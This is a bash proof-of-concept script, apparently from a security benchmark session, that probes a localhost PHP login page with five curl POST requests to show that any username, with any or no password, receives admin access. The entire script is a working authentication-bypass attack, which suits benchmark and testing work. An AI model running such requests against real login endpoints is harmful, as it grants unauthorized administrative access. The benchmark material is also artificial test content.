#!/bin/bash
# POC: Demonstrates broken authentication vulnerability where any POST request with a username parameter grants admin access, regardless of password
# Target: ./repo
# Created: 2025-11-07T21:36:34.247Z
# Session: benchmark-XBEN-072-24-mhpdc97t

# Broken Authentication POC
# Demonstrates that the application grants admin access to ANY user
# with ANY password combination

TARGET_URL="http://localhost:8080/index.php"
RESULTS_FILE="/tmp/auth_bypass_results.txt"

echo "=== Broken Authentication - Admin Access Bypass POC ==="
echo "Testing if password parameter is actually validated..."
echo ""

# Test 1: Admin with correct password
echo "[TEST 1] Admin with any password"
RESPONSE1=$(curl -s -X POST "$TARGET_URL" \
  -d "username=admin&password=sup3rsecr3t" \
  -H "Content-Type: application/x-www-form-urlencoded")

if echo "$RESPONSE1" | grep -qi "welcome admin"; then
    echo "✓ Result: HTTP 200 - 'Welcome Admin' message appears"
    TEST1_PASS=1
else
    echo "✗ Result: Response does not contain admin welcome message"
    TEST1_PASS=0
fi

# Test 2: Admin with wrong password
echo ""
echo "[TEST 2] Admin with WRONG password"
RESPONSE2=$(curl -s -X POST "$TARGET_URL" \
  -d "username=admin&password=wrongpassword123" \
  -H "Content-Type: application/x-www-form-urlencoded")

if echo "$RESPONSE2" | grep -qi "welcome admin"; then
    echo "✓ Result: HTTP 200 - 'Welcome Admin' message appears (password ignored!)"
    TEST2_PASS=1
else
    echo "✗ Result: Response does not match expected admin message"
    TEST2_PASS=0
fi

# Test 3: Random username with any password
echo ""
echo "[TEST 3] Random username (testuser) with random password"
RESPONSE3=$(curl -s -X POST "$TARGET_URL" \
  -d "username=testuser&password=randompass" \
  -H "Content-Type: application/x-www-form-urlencoded")

if echo "$RESPONSE3" | grep -qi "welcome admin"; then
    echo "✓ Result: HTTP 200 - 'Welcome Admin' message appears (any user = admin!)"
    TEST3_PASS=1
else
    echo "✗ Result: Response does not contain admin welcome"
    TEST3_PASS=0
fi

# Test 4: Non-existent user
echo ""
echo "[TEST 4] Non-existent username (fakeuser999) with any password"
RESPONSE4=$(curl -s -X POST "$TARGET_URL" \
  -d "username=fakeuser999&password=anything" \
  -H "Content-Type: application/x-www-form-urlencoded")

if echo "$RESPONSE4" | grep -qi "welcome admin"; then
    echo "✓ Result: HTTP 200 - 'Welcome Admin' message appears (even fake users get admin!)"
    TEST4_PASS=1
else
    echo "✗ Result: Response does not contain admin welcome"
    TEST4_PASS=0
fi

# Test 5: Username without password parameter
echo ""
echo "[TEST 5] Username parameter without password parameter"
RESPONSE5=$(curl -s -X POST "$TARGET_URL" \
  -d "username=admin" \
  -H "Content-Type: application/x-www-form-urlencoded")

if echo "$RESPONSE5" | grep -qi "welcome admin"; then
    echo "✓ Result: HTTP 200 - 'Welcome Admin' message appears (password parameter not required!)"
    TEST5_PASS=1
else
    echo "✗ Result: Response does not contain admin welcome"
    TEST5_PASS=0
fi

# Summary
echo ""
echo "=== VULNERABILITY SUMMARY ==="
PASSED=$((TEST1_PASS + TEST2_PASS + TEST3_PASS + TEST4_PASS + TEST5_PASS))
echo "Tests Passed: $PASSED / 5"

if [ $PASSED -ge 4 ]; then
    echo ""
    echo "CONFIRMED: Broken Authentication vulnerability exists!"
    echo "- Password parameter is completely ignored"
    echo "- Any username grants admin access"
    echo "- Authentication is not properly validated"
    exit 0
else
    echo ""
    echo "Unable to confirm vulnerability with current test results"
    exit 1
fi